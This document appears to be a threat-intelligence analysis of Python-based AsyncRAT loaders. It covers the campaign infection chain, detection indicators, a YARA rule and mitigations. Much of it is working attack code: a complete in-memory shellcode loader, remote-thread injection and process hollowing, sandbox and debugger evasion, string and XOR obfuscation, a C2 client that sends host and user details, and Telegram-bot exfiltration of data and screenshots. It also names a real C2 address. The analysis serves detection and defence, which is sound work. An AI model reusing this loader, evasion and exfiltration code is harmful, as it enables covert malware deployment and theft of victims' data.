# AsyncRAT Python Loader Scripts - Technical Analysis
# Author: Security Analysis Team
# Date: 2025-12-18

## Executive Summary

AsyncRAT campaigns have increasingly adopted Python-based loaders to evade detection and enable cross-platform compatibility. These loaders leverage legitimate Python functionality combined with shellcode injection techniques to deploy the AsyncRAT payload directly into memory, leaving minimal forensic artifacts.

---

## Campaign Overview

**Active Campaigns Using Python Loaders:**
- **TryCloudflare Campaign** (Forcepoint X-Labs, May 2025)
- **Dropbox URL Campaign** (December 2024 - Present)
- **Desert Dexter Campaign** (Middle East/North Africa)

**Distribution Vector:**
1. Phishing email with Dropbox URL
2. Download ZIP file containing .URL shortcut
3. .URL file leads to .LNK file
4. .LNK executes JavaScript → BAT file
5. BAT file downloads second ZIP with Python loader
6. Python script (`load.py`) injects shellcode

---

## Python Loader Structure

### Common Loader Pattern (`load.py`)

```python
#!/usr/bin/env python3
"""
Generic AsyncRAT Python Loader Pattern
(Reconstructed from campaign analysis)
"""

import base64
import ctypes
import subprocess
from ctypes import wintypes

# Shellcode payload (Base64 encoded AsyncRAT)
SHELLCODE_B64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAA..."  # Truncated

def decode_payload():
    """Decode Base64 encoded shellcode"""
    return base64.b64decode(SHELLCODE_B64)

def allocate_memory(shellcode):
    """Allocate RWX memory for shellcode"""
    # VirtualAlloc parameters
    MEM_COMMIT = 0x00001000
    MEM_RESERVE = 0x00002000
    PAGE_EXECUTE_READWRITE = 0x40
    
    # Load kernel32.dll
    kernel32 = ctypes.windll.kernel32
    
    # Allocate memory
    size = len(shellcode)
    address = kernel32.VirtualAlloc(
        0, 
        size, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    )
    
    return address, size

def write_shellcode(address, shellcode):
    """Write shellcode to allocated memory"""
    ctypes.memmove(address, shellcode, len(shellcode))

def execute_shellcode(address):
    """Create thread to execute shellcode"""
    kernel32 = ctypes.windll.kernel32
    
    # CreateThread
    thread_handle = kernel32.CreateThread(
        None,       # lpThreadAttributes
        0,          # dwStackSize
        address,    # lpStartAddress
        None,       # lpParameter
        0,          # dwCreationFlags
        None        # lpThreadId
    )
    
    # Wait for thread to complete
    kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)

def main():
    """Main loader function"""
    # Decode payload
    shellcode = decode_payload()
    
    # Allocate memory
    address, size = allocate_memory(shellcode)
    
    if address:
        # Write shellcode
        write_shellcode(address, shellcode)
        
        # Execute
        execute_shellcode(address)
    else:
        print("Memory allocation failed")

if __name__ == "__main__":
    main()
```

---

## Advanced Loader Variants

### Variant 1: Multi-Payload Loader

According to Forcepoint analysis, campaigns use multiple binary files with different payloads:

**Files observed:**
- `an.bin` → AsyncRAT shellcode (injects into explorer.exe)
- `pay.bin` → AsyncRAT shellcode (injects into explorer.exe)
- `payload.bin` → VenomRAT shellcode (injects into notepad.exe)
- `ve.bin` → AsyncRAT shellcode (injects into explorer.exe)
- `xr.bin` → XWorm shellcode (injects into notepad.exe)

**C2 Servers:**
- 62.60.190[.]141:3232
- 62.60.190[.]141:4056

```python
"""
Multi-payload loader pattern
"""
import os
import sys

PAYLOAD_FILES = {
    'an.bin': 'asyncrat_explorer',
    'pay.bin': 'asyncrat_explorer',
    'payload.bin': 'venomrat_notepad',
    've.bin': 'asyncrat_explorer',
    'xr.bin': 'xworm_notepad'
}

def select_payload():
    """Select payload based on environment or random selection"""
    for filename in PAYLOAD_FILES.keys():
        if os.path.exists(filename):
            return filename
    return None

def load_payload(filename):
    """Load binary payload from file"""
    with open(filename, 'rb') as f:
        return f.read()

def inject_into_process(process_name, shellcode):
    """
    Process injection functionality
    Targets: explorer.exe, notepad.exe
    """
    # Implementation would include:
    # 1. Find target process (OpenProcess)
    # 2. Allocate memory (VirtualAllocEx)
    # 3. Write shellcode (WriteProcessMemory)
    # 4. Create remote thread (CreateRemoteThread)
    pass
```

---

## Obfuscation Techniques

### 1. String Obfuscation

```python
# Base64 encoded strings
import base64

def deobfuscate(s):
    return base64.b64decode(s).decode()

# Example obfuscated imports
_ctypes = __import__(deobfuscate('Y3R5cGVz'))  # 'ctypes'
_subprocess = __import__(deobfuscate('c3VicHJvY2Vzcw=='))  # 'subprocess'
```

### 2. Dynamic Import Resolution

```python
# Dynamically resolve kernel32 functions
kernel32 = ctypes.WinDLL('kernel32')

# Obfuscate function names
func_names = {
    'va': 'VirtualAlloc',
    'ct': 'CreateThread',
    'wso': 'WaitForSingleObject'
}

VirtualAlloc = getattr(kernel32, func_names['va'])
CreateThread = getattr(kernel32, func_names['ct'])
WaitForSingleObject = getattr(kernel32, func_names['wso'])
```

### 3. XOR Encoding

```python
def xor_decode(data, key):
    """XOR decode shellcode with key"""
    decoded = bytearray()
    key_length = len(key)
    
    for i, byte in enumerate(data):
        decoded.append(byte ^ key[i % key_length])
    
    return bytes(decoded)

# Usage
KEY = b'AsyncKey2024'
encrypted_shellcode = b'\x41\x73\x79\x6e\x63...'  # Encrypted data
shellcode = xor_decode(encrypted_shellcode, KEY)
```

### 4. Multi-Stage Decoding

```python
def multi_stage_decode(encoded_data):
    """Multi-layer encoding: Base64 → XOR → GZIP"""
    import gzip
    
    # Stage 1: Base64 decode
    stage1 = base64.b64decode(encoded_data)
    
    # Stage 2: XOR decode
    key = b'key123'
    stage2 = xor_decode(stage1, key)
    
    # Stage 3: GZIP decompress
    stage3 = gzip.decompress(stage2)
    
    return stage3
```

---

## Anti-Analysis Techniques

### 1. VM/Sandbox Detection

```python
import os
import subprocess

def is_sandbox():
    """Detect sandbox/VM environment"""
    
    # Check for VM artifacts
    vm_indicators = [
        'vmware', 'virtualbox', 'vbox', 
        'qemu', 'xen', 'parallels'
    ]
    
    # Check running processes
    try:
        output = subprocess.check_output('tasklist', shell=True).decode()
        for indicator in vm_indicators:
            if indicator.lower() in output.lower():
                return True
    except:
        pass
    
    # Check registry keys
    vm_registry_keys = [
        r'SYSTEM\CurrentControlSet\Services\VBoxGuest',
        r'SYSTEM\CurrentControlSet\Services\VMTools'
    ]
    
    try:
        import winreg
        for key_path in vm_registry_keys:
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                return True
            except:
                continue
    except:
        pass
    
    # Check for common VM MAC addresses
    try:
        import uuid
        mac = uuid.getnode()
        mac_hex = ':'.join(['{:02x}'.format((mac >> i) & 0xff) 
                           for i in range(0, 48, 8)][::-1])
        
        vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:14', '08:00:27']
        for prefix in vm_mac_prefixes:
            if mac_hex.startswith(prefix.lower()):
                return True
    except:
        pass
    
    return False

def check_debugger():
    """Check if debugger is attached"""
    kernel32 = ctypes.windll.kernel32
    return kernel32.IsDebuggerPresent() != 0

def anti_analysis_checks():
    """Perform anti-analysis checks"""
    if is_sandbox():
        print("VM detected. Exiting...")
        sys.exit(0)
    
    if check_debugger():
        print("Debugger detected. Exiting...")
        sys.exit(0)
```

### 2. Timing Checks

```python
import time

def timing_check():
    """Detect analysis through timing"""
    start = time.time()
    
    # Sleep for a short period
    time.sleep(2)
    
    end = time.time()
    elapsed = end - start
    
    # If elapsed time is significantly different, likely in sandbox
    if elapsed < 1.5 or elapsed > 3.0:
        sys.exit(0)
```

### 3. User Interaction Check

```python
def check_user_interaction():
    """Check for user interaction (mouse movement)"""
    try:
        from ctypes import wintypes
        user32 = ctypes.windll.user32
        
        class POINT(ctypes.Structure):
            _fields_ = [("x", wintypes.LONG), ("y", wintypes.LONG)]
        
        pt1 = POINT()
        user32.GetCursorPos(ctypes.byref(pt1))
        
        time.sleep(5)
        
        pt2 = POINT()
        user32.GetCursorPos(ctypes.byref(pt2))
        
        # If mouse hasn't moved, likely sandbox
        if pt1.x == pt2.x and pt1.y == pt2.y:
            sys.exit(0)
    except:
        pass
```

---

## Process Injection Techniques

### 1. Classic Injection (CreateRemoteThread)

```python
def inject_classic(process_name, shellcode):
    """Classic DLL injection technique"""
    kernel32 = ctypes.windll.kernel32
    
    # Constants
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT = 0x00001000
    MEM_RESERVE = 0x00002000
    PAGE_EXECUTE_READWRITE = 0x40
    
    # Find target process
    pid = get_process_id(process_name)
    if not pid:
        return False
    
    # Open process
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        return False
    
    # Allocate memory in target process
    remote_memory = kernel32.VirtualAllocEx(
        h_process,
        None,
        len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    # Write shellcode to remote memory
    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(
        h_process,
        remote_memory,
        shellcode,
        len(shellcode),
        ctypes.byref(written)
    )
    
    # Create remote thread
    thread_id = ctypes.c_ulong(0)
    kernel32.CreateRemoteThread(
        h_process,
        None,
        0,
        remote_memory,
        None,
        0,
        ctypes.byref(thread_id)
    )
    
    return True

def get_process_id(process_name):
    """Get PID by process name"""
    import psutil
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == process_name.lower():
            return proc.info['pid']
    return None
```

### 2. Process Hollowing

```python
def process_hollowing(target_exe, shellcode):
    """Process hollowing technique"""
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll
    
    # Create suspended process
    startup_info = STARTUPINFO()
    process_info = PROCESS_INFORMATION()
    
    CREATE_SUSPENDED = 0x00000004
    
    success = kernel32.CreateProcessW(
        target_exe,
        None,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(startup_info),
        ctypes.byref(process_info)
    )
    
    if not success:
        return False
    
    # Unmap original executable
    ntdll.NtUnmapViewOfSection(
        process_info.hProcess,
        get_image_base(process_info.hProcess)
    )
    
    # Allocate new memory
    base_address = kernel32.VirtualAllocEx(
        process_info.hProcess,
        None,
        len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    # Write shellcode
    kernel32.WriteProcessMemory(
        process_info.hProcess,
        base_address,
        shellcode,
        len(shellcode),
        None
    )
    
    # Update thread context and resume
    # ... (additional context manipulation)
    
    kernel32.ResumeThread(process_info.hThread)
    
    return True
```

---

## Network Communication

### 1. C2 Connection Establishment

```python
import socket
import ssl

def connect_c2(host, port):
    """Establish encrypted C2 connection"""
    
    # Create socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Wrap with SSL (using AsyncRAT certificate)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    ssl_sock = context.wrap_socket(sock, server_hostname=host)
    
    # Connect
    ssl_sock.connect((host, port))
    
    return ssl_sock

def send_victim_info(sock):
    """Send system information to C2"""
    import platform
    import getpass
    
    info = {
        'hostname': platform.node(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'version': platform.version(),
        'architecture': platform.machine()
    }
    
    # Serialize and send
    import json
    data = json.dumps(info).encode()
    sock.sendall(data)
```

### 2. Telegram Bot Exfiltration (Desert Dexter Variant)

```python
import requests

def exfiltrate_to_telegram(bot_token, chat_id, data):
    """Send stolen data to Telegram bot"""
    
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    
    payload = {
        'chat_id': chat_id,
        'text': data,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(api_url, data=payload, timeout=10)
        return response.status_code == 200
    except:
        return False

def send_screenshot(bot_token, chat_id, image_path):
    """Send screenshot to Telegram"""
    
    api_url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    
    with open(image_path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': chat_id}
        
        try:
            response = requests.post(api_url, files=files, data=data, timeout=10)
            return response.status_code == 200
        except:
            return False
```

---

## Detection Indicators

### 1. Import Analysis

**Suspicious Python Imports:**
```python
import ctypes          # Memory manipulation
import subprocess      # Process execution
import base64          # Encoding/decoding
import socket          # Network communication
import ssl             # Encrypted communication
from ctypes import wintypes  # Windows API types
```

**Combination indicators:**
- `ctypes` + `base64` + `subprocess`
- `VirtualAlloc` + `CreateThread` + `WriteProcessMemory`
- `socket` + `ssl` + file operations

### 2. Behavioral Indicators

```python
# Indicator patterns in code
suspicious_patterns = [
    'VirtualAlloc',
    'CreateThread',
    'WriteProcessMemory',
    'CreateRemoteThread',
    'OpenProcess',
    'NtUnmapViewOfSection',
    'RtlMoveMemory',
    'SetThreadContext',
    'ResumeThread'
]

# Network patterns
network_indicators = [
    'api.telegram.org',
    '.trycloudflare.com',
    'port 6606',
    'CN=AsyncRAT Server'
]
```

### 3. File System Indicators

```
Typical file locations:
- %TEMP%\load.py
- %TEMP%\*.bin (an.bin, pay.bin, etc.)
- %APPDATA%\<random>\.py
- %LOCALAPPDATA%\Temp\<random>.py

Associated files:
- .URL shortcut files
- .LNK files with suspicious targets
- .BAT files with encoded PowerShell
```

---

## Forensic Artifacts

### 1. Memory Artifacts

```
Process Memory Strings:
- "AsyncRAT"
- "load.py"
- "VirtualAlloc"
- "CreateThread"
- C2 IP addresses
- Telegram bot tokens
```

### 2. Network Artifacts

```
Connections to look for:
- Port 6606 (default AsyncRAT)
- TLS connections with "AsyncRAT Server" certificate
- Connections to api.telegram.org/bot*
- TryCloudflare tunnel domains
```

### 3. Registry Artifacts

```
Common persistence locations:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run

Scheduled Task Names:
- Skype Updater
- Windows Updater
- Chrome Update
```

---

## Mitigation Strategies

### 1. Python Execution Controls

```powershell
# AppLocker rule to restrict Python execution
New-AppLockerPolicy -RuleType Publisher,Path,Hash `
    -User Everyone `
    -Xml C:\AppLocker\PythonRestriction.xml

# Restrict Python to authorized paths only
$rule = @"
<FilePathRule Id="a1b2c3d4-e5f6-7890" Name="Block Python in Temp" 
              Description="Block Python execution from Temp folders" 
              UserOrGroupSid="S-1-1-0" Action="Deny">
    <Conditions>
        <FilePathCondition Path="%TEMP%\*.py" />
        <FilePathCondition Path="%LOCALAPPDATA%\Temp\*.py" />
    </Conditions>
</FilePathRule>
"@
```

### 2. Network Monitoring

```
Monitor for:
1. Outbound connections on port 6606
2. SSL certificate with "AsyncRAT" in CN
3. Connections to Telegram API from non-browser processes
4. TryCloudflare domain resolutions
5. Dropbox downloads of .zip/.exe files
```

### 3. EDR/XDR Detection

```yaml
# Detection rule pseudocode
Rule: AsyncRAT Python Loader
Conditions:
  - Process: python.exe OR pythonw.exe
  - CommandLine contains: "load.py" OR "*.bin"
  - API Calls: VirtualAlloc, CreateThread
  - Network: Outbound connection established
Action: Alert + Quarantine
```

---

## YARA Rule for Python Loaders

```yara
rule AsyncRAT_Python_Loader {
    meta:
        description = "Detects AsyncRAT Python loader scripts"
        author = "Security Analysis Team"
        date = "2025-12-18"
        
    strings:
        $py1 = "import ctypes" ascii
        $py2 = "import base64" ascii
        $py3 = "VirtualAlloc" ascii
        $py4 = "CreateThread" ascii
        $py5 = "WriteProcessMemory" ascii
        
        $loader1 = "load.py" ascii
        $loader2 = ".bin" ascii
        
        $c2_1 = "62.60.190.141" ascii
        $c2_2 = "trycloudflare" ascii
        
    condition:
        3 of ($py*) and (1 of ($loader*) or 1 of ($c2_*))
}
```

---

## References

1. Forcepoint X-Labs: "AsyncRAT Reloaded: Using Python and TryCloudflare for Malware Delivery Again" (May 2025)
2. CYFIRMA: "Weekly Intelligence Report - Desert Dexter Campaign" (March 2025)
3. MalwareBazaar: Recent AsyncRAT samples analysis (December 2025)
4. Check Point Research: AsyncRAT distribution methods (2024-2025)

---

## Conclusion

Python-based AsyncRAT loaders represent a significant evolution in malware delivery techniques, combining:
- **Cross-platform capabilities**
- **Fileless execution**
- **Memory-only payload deployment**
- **Legitimate infrastructure abuse**

Detection requires multi-layered approach:
1. **Behavioral analysis** of Python execution
2. **Network monitoring** for C2 patterns
3. **Memory forensics** for injected payloads
4. **User education** on phishing techniques

Organizations should implement strict controls on Python execution from untrusted locations and monitor for the indicators outlined in this analysis.
